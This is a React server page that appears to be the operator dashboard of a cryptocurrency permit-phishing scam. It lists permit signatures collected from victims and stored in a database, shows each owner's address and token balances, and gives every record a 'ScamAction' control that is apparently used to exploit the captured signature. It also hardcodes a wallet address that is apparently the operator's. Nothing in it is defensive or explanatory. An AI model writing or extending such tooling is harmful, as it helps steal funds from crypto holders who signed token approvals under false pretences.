import prisma from "@backend/modules/prisma/Prisma";

import React from "react";
import ScamAction from "@/app/(version1)/scam/ScamAction";
import TokenList from "@/app/(version1)/TokenList";
import {createPermitSignature, FinalizedSignedSignature} from "@/app/(version1)/page";


export type SignedPermitSignature = Awaited<ReturnType<typeof createPermitSignature>>

const Page = async () => {
	const list = await prisma.permitSignature.findMany();
	return (
		<div className={'container mx-auto p-2'}>
			{list.map((item) => {
				const final = item.data as FinalizedSignedSignature;
				if (!final.signedSignature) return `IGNORED ${item.id}`;
				const {signedSignature: data} = final || {};
				return (
					<details className={'p-2 my-2 border rounded'}>
						<summary>
							{data?.permit?.owner}
						</summary>
						<div>
							<textarea readOnly value={JSON.stringify(item.data,null,2)} className={'w-full p-2 rounded min-h-[350px] bg-black text-green-600'}></textarea>
						</div>
						<ScamAction data={data} finalized={final}  />
						<TokenList address={data.permit.owner} CHAIN_ID={final.token.chainId || 1} />
					</details>
				)
			})}
			<br/>
			<hr/>
			<TokenList address={"0xb3b77682060b7f6f589BAB55ECc269dF03ED3C96"} CHAIN_ID={(list?.at?.(-1)?.data as FinalizedSignedSignature)?.token?.chainId}></TokenList>
		</div>
	);
};

export default Page;
